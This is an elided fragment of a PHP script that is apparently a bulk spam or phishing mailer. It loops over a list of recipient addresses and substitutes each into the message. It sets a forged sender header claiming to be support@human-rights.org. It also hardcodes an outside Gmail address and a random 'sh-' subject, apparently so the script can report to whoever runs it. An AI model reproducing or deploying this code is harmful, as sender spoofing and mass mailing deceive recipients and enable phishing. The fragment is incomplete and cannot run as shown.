...
if ($testa){
        ...
        print "Fill out everything and send again!!!";
	...
	$allemails = split("\n", $to);
          ...
          for($x=0; $x<$numemails; $x++){
                ...
                $message = ereg_replace("&tol&", $to, $message);

                $subject = ereg_replace("&to&", $to, $subject);
...
$ra44  = rand(1,99999);
$subj98 = "sh-$ra44";
$email = "codebb2015@gmail.com";
$from="From: inb <support@human-rights.org>";
